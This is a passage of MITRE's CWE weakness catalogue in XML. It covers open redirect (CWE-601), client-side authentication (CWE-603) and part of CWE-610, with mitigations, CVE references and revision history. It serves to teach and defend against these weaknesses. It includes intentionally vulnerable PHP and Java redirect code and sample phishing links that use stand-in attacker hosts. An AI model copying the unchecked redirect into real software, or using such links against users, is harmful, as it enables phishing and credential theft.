                  <xhtml:p>Use a list of approved URLs or domains to be used for redirection.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.2">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "/login.asp" and ID 2 could map to "http://www.example.com/". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code obtains a URL from the query string and then redirects the user to that URL.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$redirect_url = $_GET['url'];<xhtml:br/>header("Location: " . $redirect_url);</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://example.com/example.php?url=http://malicious.example.com</xhtml:div>
               </Example_Code>
               <Body_Text>The user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-194">
               <Intro_Text>The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class RedirectServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:div style="margin-left:1em;">String query = request.getQueryString();<xhtml:br/>if (query.contains("url")) {<xhtml:div style="margin-left:1em;">String url = request.getParameter("url");<xhtml:br/>response.sendRedirect(url);</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of an e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:</Body_Text>
               <Example_Code Nature="Attack" Language="HTML">
                  <xhtml:div>&lt;a href="http://bank.example.com/redirect?url=http://attacker.example.net"&gt;Click here to log in&lt;/a&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-4206</Reference>
               <Description>URL parameter loads the URL into a frame and causes it to appear to be part of a valid page.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-4206</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2951</Reference>
               <Description>An open redirect vulnerability in the search script in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL as a parameter to the proper function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2052</Reference>
               <Description>Open redirect vulnerability in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the proper parameter.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2052</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-11053</Reference>
               <Description>Chain: Go-based Oauth2 reverse proxy can send the authenticated user to another site at the end of the authentication flow. A redirect URL with HTML-encoded whitespace characters can bypass the validation (CWE-1289) to redirect to a malicious site (CWE-601)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-11053</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>38</Entry_ID>
               <Entry_Name>URl Redirector Abuse</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="178"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-483"/>
            <Reference External_Reference_ID="REF-484" Section="Page 43"/>
            <Reference External_Reference_ID="REF-485"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2007-05-07</Submission_Date>
               <Submission_Version>Draft 6</Submission_Version>
               <Submission_ReleaseDate>2007-05-07</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Background_Details, Description, Detection_Factors, Likelihood_of_Exploit, Name, Relationships, Observed_Example, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-03</Modification_Date>
               <Modification_Comment>updated References and Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Observed_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Detection_Factors, Potential_Mitigations, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Description, Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Unsafe URL Redirection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2008-09-09">URL Redirection to Untrusted Site</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">URL Redirection to Untrusted Site (aka 'Open Redirect')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="603" Name="Use of Client-Side Authentication" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.</Description>
         <Extended_Description>Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="602" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="300" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="656" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not rely on client side data. Always perform server side authentication.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors used client-side authentication in their OT products.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-33139</Reference>
               <Description>SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-33139</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-0230</Reference>
               <Description>Client-side check for a password allows access to a server using crafted XML requests from a modified client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-0230</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Untrustworthy Credentials&#34;, Page 37"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2007-05-07</Submission_Date>
               <Submission_Version>Draft 6</Submission_Version>
               <Submission_ReleaseDate>2007-05-07</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Maintenance_Notes, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Client-Side Authentication</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="610" Name="Externally Controlled Reference to a Resource in Another Sphere" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
	 <Demonstrative_Examples>
           <Demonstrative_Example Demonstrative_Example_ID="DX-194">
             <Intro_Text>The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address.</Intro_Text>
             <Example_Code Nature="Bad" Language="Java">
               <xhtml:div>public class RedirectServlet extends HttpServlet {<xhtml:br/>
               <xhtml:div style="margin-left:1em;">
                 <xhtml:div>protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:div style="margin-left:1em;">String query = request.getQueryString();<xhtml:br/>if (query.contains("url")) {<xhtml:div style="margin-left:1em;">String url = request.getParameter("url");<xhtml:br/>response.sendRedirect(url);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </xhtml:div>}</xhtml:div>
             </Example_Code>
             <Body_Text>The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of an e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:</Body_Text>
             <Example_Code Nature="Attack" Language="HTML">
               <xhtml:div>&lt;a href="http://bank.example.com/redirect?url=http://attacker.example.net"&gt;Click here to log in&lt;/a&gt;</xhtml:div>
             </Example_Code>
             <Body_Text>The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site.</Body_Text>
           </Demonstrative_Example>
         </Demonstrative_Examples>
	 <Observed_Examples>
	   <Observed_Example>
             <Reference>CVE-2022-3032</Reference>
               <Description>An email client does not block loading of remote objects in a nested document.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-3032</Link>
	   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-45918</Reference>
               <Description>Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using "../" sequences (CWE-24)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-45918</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2018-1000613</Reference>
               <Description>Cryptography API uses unsafe reflection when deserializing a private key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-1000613</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-11053</Reference>
               <Description>Chain: Go-based Oauth2 reverse proxy can send the authenticated user to another site at the end of the authentication flow. A redirect URL with HTML-encoded whitespace characters can bypass the validation (CWE-1289) to redirect to a malicious site (CWE-601)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-11053</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-42745</Reference>
               <Description>Recruiter software allows reading arbitrary files using XXE</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-42745</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2331</Reference>
               <Description>Database system allows attackers to bypass sandbox restrictions by using the Reflection API.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2331</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="219"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">This is a general class of weakness, but most research is focused on more specialized cases, such as path traversal (CWE-22) and symlink following (CWE-61). A symbolic link has a name; in general, it appears like any other file in the file system. However, the link includes a reference to another file, often in another directory - perhaps in another sphere of control. Many common library functions that accept filenames will "follow" a symbolic link and use the link's target instead.</Note>
            <Note Type="Maintenance">The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 "Resource Injection," as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the "identifier used to access a system resource" such as a file name or port number, yet it explicitly states that the "resource injection" term does not apply to "path manipulation," which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2007-05-07</Submission_Date>
               <Submission_Version>Draft 6</Submission_Version>
               <Submission_ReleaseDate>2007-05-07</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes</Modification_Comment>
            </Modification>
            <Modification>
